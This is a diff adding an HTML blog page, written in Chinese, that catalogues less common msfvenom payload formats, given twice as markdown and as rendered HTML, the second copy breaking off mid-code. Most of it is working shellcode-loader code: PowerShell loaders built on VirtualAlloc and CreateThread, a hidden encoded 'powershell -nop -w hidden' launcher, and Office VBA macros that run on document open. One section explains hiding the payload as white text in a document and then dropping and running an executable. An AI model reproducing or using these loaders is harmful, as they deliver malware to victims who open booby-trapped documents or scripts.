@@ -1,0 +1,658 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+msfvenom 中一些不那么常见的 payload 格式.
+
+## powershell (ps1)
+
+用来生成方便在 powershell 脚本中调用的 shellcode 变量.
+
+```
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c......
+```
+
+调用方式请参考 `Invoke-Shellcode`. 
+
+## psh-net
+
+通过 c# 导入 win32api 执行 shellcode.
+
+```
+Set-StrictMode -Version 2
+$fByu7 = @"
+	using System;
+	using System.Runtime.InteropServices;
+	namespace hfn9 {
+		public class func {
+			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
+			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
+			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
+			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
+		}
+	}
+"@
+
+$q9qGo = New-Object Microsoft.CSharp.CSharpCodeProvider
+$lumS = New-Object System.CodeDom.Compiler.CompilerParameters
+$lumS.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
+$lumS.GenerateInMemory = $True
+$fZR6 = $q9qGo.CompileAssemblyFromSource($lumS, $fByu7)
+
+[Byte[]]$r5yy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiL......")
+
+$ew = [hfn9.func]::VirtualAlloc(0, $r5yy.Length + 1, [hfn9.func+AllocationType]::Reserve -bOr [hfn9.func+AllocationType]::Commit, [hfn9.func+MemoryProtection]::ExecuteReadWrite)
+if ([Bool]!$ew) { $global:result = 3; return }
+[System.Runtime.InteropServices.Marshal]::Copy($r5yy, 0, $ew, $r5yy.Length)
+[IntPtr] $nbU = [hfn9.func]::CreateThread(0,0,$ew,0,0,0)
+if ([Bool]!$nbU) { $global:result = 7; return }
+$uT6h = [hfn9.func]::WaitForSingleObject($nbU, [hfn9.func+Time]::Infinite)
+```
+
+## psh-reflection
+
+使用反射和委托执行 shellcode, 间接调用 win32api.
+
+```
+function hh {
+	Param ($w9Nl, $jD_Z1)		
+	$sJq = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	
+	return $sJq.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($sJq.GetMethod('GetModuleHandle')).Invoke($null, @($w9Nl)))), $jD_Z1))
+}
+
+function rW {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $bJDR,
+		[Parameter(Position = 1)] [Type] $oD0 = [Void]
+	)
+	
+	$wa = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$wa.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $bJDR).SetImplementationFlags('Runtime, Managed')
+	$wa.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $oD0, $bJDR).SetImplementationFlags('Runtime, Managed')
+	
+	return $wa.CreateType()
+}
+
+[Byte[]]$cb = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg......")
+		
+$srf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll VirtualAlloc), (rW @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $cb.Length,0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($cb, 0, $srf, $cb.length)
+
+$uC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll CreateThread), (rW @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$srf,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll WaitForSingleObject), (rW @([IntPtr], [Int32]))).Invoke($uC,0xffffffff) | Out-Null
+```
+
+## psh-cmd
+
+使用 `powershell -enc` 一键执行, 实质为将 shellcode 加载至内存, 然后创建进程.
+
+```
+%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArA
+......
+```
+
+解码后的内容.
+
+```
+if([IntPtr]::Size -eq 4 {
+    $b='powershell.exe'
+} else {
+    $b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
+};
+$s=New-Object System.Diagnostics.ProcessStartInfo;
+$s.FileName=$b;
+$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAMGUPl0CA7VWbW/aSBD+nEj5D1aFhK0QDIEmTaRKt+ad4sTEgUAoOm3stb2wtsl6DYG2//3G2E7Ta3LXnnQWL/syMzvzzDOzduLAEjQMJDEYZsr......''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
+$s.UseShellExecute=$false;
+$s.RedirectStandardOutput=$true;
+$s.WindowStyle='Hidden';
+$s.CreateNoWindow=$true;
+$p=[System.Diagnostics.Process]::Start($s);
+```
+
+## vba
+
+调用 win32api 将 shellcode 加载至内存, 然后创建进程.
+
+```
+#If Vba7 Then
+	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Dqarj As Long, ByVal Ugoinxes As Long, ByVal Rnynjmirt As LongPtr, Voc As Long, ByVal Ehoghklrh As Long, Ybsykabhv As Long) As LongPtr
+	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Uzi As Long, ByVal Rfewcsbud As Long, ByVal Xdydsi As Long, ByVal Ranjbjyup As Long) As LongPtr
+	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Foz As LongPtr, ByRef Jwgy As Any, ByVal Ave As Long) As LongPtr
+#Else
+	Private Declare Function CreateThread Lib "kernel32" (ByVal Dqarj As Long, ByVal Ugoinxes As Long, ByVal Rnynjmirt As Long, Voc As Long, ByVal Ehoghklrh As Long, Ybsykabhv As Long) As Long
+	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Uzi As Long, ByVal Rfewcsbud As Long, ByVal Xdydsi As Long, ByVal Ranjbjyup As Long) As Long
+	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Foz As Long, ByRef Jwgy As Any, ByVal Ave As Long) As Long
+#EndIf
+
+Sub Auto_Open()
+	Dim Pkwkdexzr As Long, Mcpo As Variant, Cggw As Long
+#If Vba7 Then
+	Dim  Ekfzpnfyt As LongPtr, Udtzjekhw As LongPtr
+#Else
+	Dim  Ekfzpnfyt As Long, Udtzjekhw As Long
+#EndIf
+	Mcpo = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183......)
+
+	Ekfzpnfyt = VirtualAlloc(0, UBound(Mcpo), &H1000, &H40)
+	For Cggw = LBound(Mcpo) To UBound(Mcpo)
+		Pkwkdexzr = Mcpo(Cggw)
+		Udtzjekhw = RtlMoveMemory(Ekfzpnfyt + Cggw, Pkwkdexzr, 1)
+	Next Cggw
+	Udtzjekhw = CreateThread(0, 0, Ekfzpnfyt, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+	Auto_Open
+End Sub
+Sub Workbook_Open()
+	Auto_Open
+End Sub
+```
+
+## vba-exe
+
+分为 loader 和 shellcode 两部分, 运行时 loader 将从 doc 文档内容里获取 shellcode, 然后保存为 exe 执行.
+
+打开 doc 文档后将 payload 粘贴至文档末尾, 然后将字体颜色调为白色.
+
+如果显示红色下划线就把 loader 和 payload 里的定位符 (这里是 Hmnywqavfc) 改成常用的单词.
+
+```
+'**************************************************************
+'*
+'* This code is now split into two pieces:
+'*  1. The Macro. This must be copied into the Office document
+'*     macro editor. This macro will run on startup.
+'*
+'*  2. The Data. The hex dump at the end of this output must be
+'*     appended to the end of the document contents.
+'*
+'**************************************************************
+'*
+'* MACRO CODE
+'*
+'**************************************************************
+
+Sub Auto_Open()
+	Cseed12
+End Sub
+
+Sub Cseed12()
+	Dim Cseed7 As Integer
+	Dim Cseed1 As String
+	Dim Cseed2 As String
+	Dim Cseed3 As Integer
+	Dim Cseed4 As Paragraph
+	Dim Cseed8 As Integer
+	Dim Cseed9 As Boolean
+	Dim Cseed5 As Integer
+	Dim Cseed11 As String
+	Dim Cseed6 As Byte
+	Dim Hmnywqavfc as String
+	Hmnywqavfc = "Hmnywqavfc"
+	Cseed1 = "SqfibJKpmkMGwu.exe"
+	Cseed2 = Environ("USERPROFILE")
+	ChDrive (Cseed2)
+	ChDir (Cseed2)
+	Cseed3 = FreeFile()
+	Open Cseed1 For Binary As Cseed3
+	For Each Cseed4 in ActiveDocument.Paragraphs
+		DoEvents
+			Cseed11 = Cseed4.Range.Text
+		If (Cseed9 = True) Then
+			Cseed8 = 1
+			While (Cseed8 < Len(Cseed11))
+				Cseed6 = Mid(Cseed11,Cseed8,4)
+				Put #Cseed3, , Cseed6
+				Cseed8 = Cseed8 + 4
+			Wend
+		ElseIf (InStr(1,Cseed11,Hmnywqavfc) > 0 And Len(Cseed11) > 0) Then
+			Cseed9 = True
+		End If
+	Next
+	Close #Cseed3
+	Cseed13(Cseed1)
+End Sub
+
+Sub Cseed13(Cseed10 As String)
+	Dim Cseed7 As Integer
+	Dim Cseed2 As String
+	Cseed2 = Environ("USERPROFILE")
+	ChDrive (Cseed2)
+	ChDir (Cseed2)
+	Cseed7 = Shell(Cseed10, vbHide)
+End Sub
+
+Sub AutoOpen()
+	Auto_Open
+End Sub
+
+Sub Workbook_Open()
+	Auto_Open
+End Sub
+
+'**************************************************************
+'*
+'* PAYLOAD DATA
+'*
+'**************************************************************
+
+Hmnywqavfc
+&H4D&H5A&H90&H00&H03&H00&H00&H00&H04&H00&H00&H00&HFF&HFF&H00&H00&HB8&H00&H00&H00&H00&H00&H00&H00&H40&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00......
+```
+
+## vba-psh
+
+调用 powershell 执行 shellcode.
+
+```
+Sub zfx88nq1O()
+  Dim neqc
+  neqc = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3A" _
+& "GUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgB" _
+& "BAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI" _
+& "ABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFM" _
+& "AdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBCAFcAVwBQAGwAMABDAEEANwBWAFcAYgBXAC8AYQBTAEIARAArAG4ARQBqADUARAAxAGEARgBaAEYAcwBoAEcAQgBMAGEATgBKAEUAcQAzAFoAcAAzAGkAaABPAEkAZwBVAEEAbwBxAGoAYgAyADIAbAA2AHkAOQBvAEsAOQBEAG8ARgBlAC8ALwB2AE4AZwBwADIAbQAxADcAUgBxAFQAegBxAEwAbAAzA" _
+& "DIAWgBtAFoAMQA1ADUAcABsAFoAZQAyAG4AawBDAE0AbwBqADUAWgA0ADMAbQBzAHEAWABvADgATwBEAFAAbwA1AHgAcQBHAGkARgA5AGEAbgBWADgANABwAEsAWQBWAEcALwBFAHQAZgA2AHcAUQBGAHMARgBaAEwAKwBaACsAVwBEAG8AcwAzAFEAYwBsAG4AbgBJAGEAYgBSAC8AUABLAHkAbABzAFkAeABpAGMAUgArAFgAbQBvAFIAZwBaAEsARQB" _
+& "oAFAAZQBNAGsAawBUAFQAbABiACsAVgAyADQARABFADUATwBUADYAZgBrAEUAYwBvAFgAeABSAEMAcAA5AEwATABjAGIAdgBNAGMAdgBFAE4AagBYAHMAQgBFAFEANQBRAFoARQByADkAMwByAGMAdwBkAEsAZgBrAHIAMQBrAFYARwBqAHEAcAAwACsAcQBQAGoAdQBwAHoARQB1AE4AVgBZAHAAWgBvAHEAbgAyAEoAaABFAGsATABMAG0ATQBxAGIAc" _
+& "gB5AFYAWgBjAEgARABqAGQATABvAHEAawBXAGQAVwBLAGUAYwBFACsAVQBiAG0AbAAwAGQAbABvAGEAUgBRAG4AMgB5AEIAVgBZAGUAeQBRAFcARQBRAEYAMwBFADEAVwBIAEkATwBBAFQARQA1AEgARwBrAFMATABEAGsAZgByADcAWABVADIARgBZAFQALwBtAEQAbgBMAGQAbQBDAFMASgBXAGwAUgBtADAAdgBKAHMAUAB2ADkATABtADIAWABIADM" _
+& "AcQBTAFIAbwBDAEUAcABkAFMASgBCAFkAcgA2ADAAUwBmAHgASQBIAFoASwBVADIAagBoAHkARwBiAGsAaAAzAGgAeQAwAGIAQgBIAFQAeQBKAC8AcgBPAG8AZwA5ADgAZwBlAGkARgBhAEsAVQBzAGEATAB5AEoAMgBhADAASwA3AEwATwBRAGYAdABkAEoAZQAyAGwARQBrAGoAMQBSAGEAdwBYAEkAWgBNAC8AaABtAGwAeABOADIAVgBrAHIANgBpA" _
+& "CsANAB1AGMAKwArAFQAbwA4AHoAdwBRAEEANgBMADQAZQBIAFIANABkAGUAagBsAGgAMQBxAE8AWABkAEkASABSAHcAVwB3ADMASgB1AEMAZAAxAHUAYwBKADMAVQBsADkAVQBNAHAARgB4AFkASwBEAHMATwBEAHgAQgBxAGEARgBZAFoAdwBTAGYAZgA2AE0AcgBWAEwAdwB5AHMAVwBmAGEAMQBkAHkAVQBSAEQARQBnAC8AbwBZAGwAbQBaAGoAVAB" _
+& "0ADAANQBxAEcAVABaAEwAQQBUAGoAbwBWAHoAKwBPAFMAbgByAHgASwBNAFIAcQBXADgAaQBIAEYASQBuADUANQAzADIARwBzAFQARQBZADIAUQBYAFgAaQBrAFgAdQB3AEsAZgBOAEQAWABiAEkARwA2AGQATQBPAEoAagBJAFYARwBUAG0AZgA1AEIAcgBSAEYAUwA4AGEAeAByAHAAcABTADUASgBFAFkATwBwAEMAawBCAHIAeQBDAEQAKwB2AGYAT" _
+& "wA3AEIATwBoAHEAWgAzAEkASQBpAEUAQQB0AEoAOABEADkAUQBvAGUAcwBKADMAawAwAGgAbgBEAE4ALwBuAHAAYwBnADUAQwBhAG8AMwBoAEoAQwBrAHEALwBSAFQASwB6AFMAawBxAE4AcwBHAE0AdQBFAFUARgBSAFEAbgBOAHQAbABBAHEAKwBHADYAbwBmAG4AUABYAFMAcABtAGcARABrADUARQBiAG0ANgB1AFoAegBCAG0AeAA5AFYANABsAEk" _
+& "AZwA0AGQAUwBCAGwARQBQAHIAUQBYAGgASwBIAFkAaQBhAFIASwBDAHAAdAA2AGgASgB6AFkAMQBNAC8AUAAxAFoAOQBGAFkAYwBhAFoAZwB5AEsAQQBDAHcAOQBRAGgANQBnAFIAYwBaAHYAQwAwAG0ARQAyAEoAWABoAGwAZgBXAFMAVABVAFEAbgBYAEQASQBTAGcAcwBTAHUANgBKAHMATQArADEARABpAEcAZABGADMAdgBNAEUAKwBjAGQAVgAvA" _
+& "HUAWgBjAFQAZQBjADkAYQBpAFUATQBPAHcAQQB2AG4ASQBMAGsAMgA0ADYASwBvAGoARwBrAHMAbwBIAFYASQBUAEMAVwBCAC8AcwB2AFoATAAxAHEARwA5AEsASQBXAGsAeQB3AEgAVwBsADQAVgBNADMATQBqAEoASgBzAEwAZgBEAFAAcABTAGoASgBtAGkATwB6AGkAagB3AFgARQAzAG8AeAA1AGEATwBLAEUAdgBLAHYAdQAyADQAUAAyAHgAcgB" _
+& "pAG0ATgBRAFQAUAB0AEIATQB4AHkAegBFAGYAYQBBAFcAdABhAGEAVgBqAHcAWABkAEUAegB6AHEAOABmAHUANQArADcAQwA3AGEAUgBsAHgALwBDAGoAegBVAFMAVABwAFcAdQAxADgAZgB0AE4AdgBWAHgANgA0ADkAcgBnAHEANwAwAFIARQBmACsAeAAxAGgATgBTAGEATABoAFkAMwBhAE4ANgBPAHAAdQBPAHUAZwA5AHAAQwBXAEgANgBiAFYAN" _
+& "wBiAEoATAB0ADMAWQBQAHUAZABNAG4ANAA5ADMAVwAzAEsANwBMADUAdABOADIANABiAHYAZQB0AE8ANQA1AC8AcgBsAG4AMwAxAFQAZQBOAG0AbgB2AHQAagBZAHcAeQA2AGUANABWADIAKwBrAHYAVgB0AHoAYgBaAGEAcgBTAFkATwB1ADIAdwBNADYARwBqAHgAMABtACsASgArAE8AbQBaADQANQBCAG4AKwBwAEgASwBCADYAVgBNAHYAWABvAHc" _
+& "AcgAzAE4AcAAyAEUARwBvAEYAWgA4ADYAMgA2ADQAMQBiAGcAZQBWAHUAcABtADEASwBGAGsAYQA1AFIAdwBkAG8AZwBOAEIASAA1ADIAWQAwAGEAdgBsAEwAdgA1AFUAZwA0ADIASwA4AHEAbwBVAEwAdABFAEkATgBFADYATQBPAGEAbwB3ADMAMwBiAGYATQBIAEkAeQBhAEoAaABvADEAegBBAEcAKwA1AHYAMgB6ADQANwBwAFIAdQBYAE4AWABqA" _
+& "GUAYgBkAEIASABkAEQANQByAGIAYQBSAG0AVQA2AFEAUwA2AEsAagBhAEUAZgBWAE0ANgB2AGcAMABqAGkAaABIADEAegBaAFUAbwBaADEATAB2AGIATgBBADIAUQA2AFYAZABSAHUAMwBwAEsAdAAzAGUAcgBRAGMAdABIAEQAWgBBAFoAaAB4AHoAaABKAG4AMABZAEgAVQAvAEEANQB0AFUAUQBkAEcANQBIAEYAWgBjAGoARQBYAFUAbQBoAGoASAA" _
+& "yAEQAUgA5ADUAZABqAEQARgB5AEEAUgBwAGMANABXAGEASgBxADkAdAAzAHYAZQB0AHYAagBFAGUAbgB3AGEAVgArADQAZABLAEEARAA2AFQAeQBlAE4ANwBxADQAdQBPAG0AMAA3AGYATQBJAHoAagA4AEIANQArAEQAZQBSAFkAeQA2AGQAbwBZAHEANwBQAEgAOQBjAEMAZAAyAC8AQgA5AHQAQwA0AEcASAAxADQASQB5AGsAQwBIAEMAbQBzAEwAb" _
+& "AA1AGsALwBtAGYAZAAyAHMASgB4AEUAbQBBAEcAagBJAEEAKwBuAEIAZABnAGsAOABmAE4AcgBLAC8AMgBPAFoAVQBhAG0AcgBhADcAawBCADkASQBIAEIARQBHAHQAeABuAGMAZAB6AG0AVABFAFcAUABjAGsAWQAwAGQATwBqAEIAYwBLAGYAdABHAEwAKwArAGQARQBRAHoAUABUAGwAOABkADYAYwBxAHoAbwBQADYAdAAzACsAZABMAGwANQBkADM" _
+& "ANABDAE4AVQBoAG0AUgB2AHEAVQBjAGkAWAB3AFQARgA4AHQATgBaAHUAUQB6AE4AdQAvAHgAVQBMAFUATwBFAHYAeAA5AFgAagBTADgAMwAyAHMANQBVAFUAVABaAC8AZwBDAFcAMwB6AEgAYQBXAGQAVgBrAHcAQgBVADcALwBYADcAQwB5AEkAZwAzAGcAegAvADAAMQBXAE4ALwBXAGYAcgBIADcAVwB3AEMAVwBpAHoATABZAEgAeABhAC8AWAAvA" _
+& "GcAagBMAFAAOAA0ADcARgB0AE0AQgBVAGoAYQAwAEcARQBZADIAVgA5AHUAcgAwAFcAZgBzAGUATABGADEAYwA4AHAAWgBOAHoATABIAHYAbgBlAGQAcAAyAEsAawB5AHQANABIAHoAZwA2AC8AQQBkADQAOQA0ADYATgBKAEEAbwBBAEEAQQA9AD0AJwAnACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA" _
+& "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAd" _
+& "AA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADs" _
+& "A"
+  Call Shell(neqc, vbHide)
+End Sub
+Sub AutoOpen()
+  zfx88nq1O
+End Sub
+Sub Workbook_Open()
+  zfx88nq1O
+End Sub
+```
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<p>msfvenom 中一些不那么常见的 payload 格式.</p>
+
+<h2 id="powershellps1">powershell (ps1)</h2>
+
+<p>用来生成方便在 powershell 脚本中调用的 shellcode 变量.</p>
+
+<pre><code>[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c......
+</code></pre>
+
+<p>调用方式请参考 <code>Invoke-Shellcode</code>. </p>
+
+<h2 id="pshnet">psh-net</h2>
+
+<p>通过 c# 导入 win32api 执行 shellcode.</p>
+
+<pre><code>Set-StrictMode -Version 2
+$fByu7 = @"
+    using System;
+    using System.Runtime.InteropServices;
+    namespace hfn9 {
+        public class func {
+            [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
+            [Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
+            [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
+            [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+            [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+            [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
+        }
+    }
+"@
+
+$q9qGo = New-Object Microsoft.CSharp.CSharpCodeProvider
+$lumS = New-Object System.CodeDom.Compiler.CompilerParameters
+$lumS.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
+$lumS.GenerateInMemory = $True
+$fZR6 = $q9qGo.CompileAssemblyFromSource($lumS, $fByu7)
+
+[Byte[]]$r5yy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiL......")
+
+$ew = [hfn9.func]::VirtualAlloc(0, $r5yy.Length + 1, [hfn9.func+AllocationType]::Reserve -bOr [hfn9.func+AllocationType]::Commit, [hfn9.func+MemoryProtection]::ExecuteReadWrite)
+if ([Bool]!$ew) { $global:result = 3; return }
+[System.Runtime.InteropServices.Marshal]::Copy($r5yy, 0, $ew, $r5yy.Length)
+[IntPtr] $nbU = [hfn9.func]::CreateThread(0,0,$ew,0,0,0)
+if ([Bool]!$nbU) { $global:result = 7; return }
+$uT6h = [hfn9.func]::WaitForSingleObject($nbU, [hfn9.func+Time]::Infinite)
+</code></pre>
+
+<h2 id="pshreflection">psh-reflection</h2>
+
+<p>使用反射和委托执行 shellcode, 间接调用 win32api.</p>
+
+<pre><code>function hh {
+    Param ($w9Nl, $jD_Z1)     
+    $sJq = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+    return $sJq.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($sJq.GetMethod('GetModuleHandle')).Invoke($null, @($w9Nl)))), $jD_Z1))
+}
+
+function rW {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $bJDR,
+        [Parameter(Position = 1)] [Type] $oD0 = [Void]
+    )
+
+    $wa = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $wa.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $bJDR).SetImplementationFlags('Runtime, Managed')
+    $wa.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $oD0, $bJDR).SetImplementationFlags('Runtime, Managed')
+
+    return $wa.CreateType()
+}
+
+[Byte[]]$cb = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg......")
+
+$srf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll VirtualAlloc), (rW @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $cb.Length,0x3000, 0x40)
